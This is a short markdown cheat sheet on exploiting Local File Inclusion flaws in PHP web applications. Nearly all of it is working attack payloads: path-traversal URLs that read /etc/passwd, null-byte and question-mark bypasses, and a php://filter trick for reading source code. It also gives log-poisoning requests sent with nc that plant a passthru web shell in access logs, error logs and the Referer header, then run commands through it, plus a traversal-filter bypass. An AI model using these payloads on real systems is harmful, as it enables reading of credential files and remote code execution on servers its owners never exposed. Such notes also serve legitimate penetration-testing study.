# Local File Inclusion
 > Accessing files without proper permissions, find a parameter that loads a current file and try to change it to load another file that you may want.

### Basic Example
**Url:**  
`http://<ip>/home?page=contact.html → This is the original url`  
**Can this work:**  
`http://<ip>/home?page=contact.html../../../../etc/passwd`


### File extensions
**Example Code:**  
```
$file = $_GET['page']; 
require($file . ".php");
```

**Potential Solution:**
`http://<ip>/home?page=contact.html../../../../etc/passwd%00`
Null Byte Only works for php version < 5.3  


Can add a question Mark at the end so everything gets interpreted as a parameter:
`http://<ip>/home?page=contact.html../../../../etc/passwd?`

### Reading PHP Files
`http://<ip>/home?page=php://filter/convert.base64-encode/resource=<page>`  
You might want to read SSH files, log files, backup files, server config, bash history


### Inserting PHP Code into the log file
```
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Can also add it to the error log by making a req to a page that does not exist
```
nc 192.168.1.102 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Or in the refferer parameter
```
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close
```

**Execute it in the browser**
`http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id`

### Bypassing Filters
To escape the server stripping ../../../, add 2 dots and 2 slashes. Such as ….//….//….//

Try sending in a post request if php is configured in $_GET instead of $_REQUEST
